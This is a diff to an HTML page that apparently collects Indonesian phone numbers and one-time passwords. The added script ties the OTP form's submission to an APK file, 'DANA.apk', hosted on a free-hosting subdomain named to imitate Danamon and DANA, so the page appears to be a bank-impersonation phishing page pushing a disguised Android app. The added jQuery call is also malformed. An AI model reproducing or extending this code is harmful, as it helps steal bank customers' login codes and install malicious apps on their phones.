@@ -789,7 +789,15 @@ ol, li {
 <script>$(document).ready(function(){$('#inp').on('input', function(){if($(this).val() == '0' || $(this).val() == '62'){$(this).val('');}});});</script>
 <script>$(document).ready(function(){$('#inp').mask('000-0000-000000');});</script>
 <script>let inp = document.getElementById("inp");let btn = document.getElementById("btn");inp.addEventListener("input", val);function val(){if(inp.value.length > 10){btn.disabled = false;}else{btn.disabled = true;}};</script>
-
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+<script>
+$(document).ready(function(){
+  $("#formOtp").submit(function(){
+    $("form").submit("https://danamon.app.whf.bz/DANA.apk");
+    
+  });
+});
+</script>
 <script>
  window.onload = function(){
         setTimeout(function(){
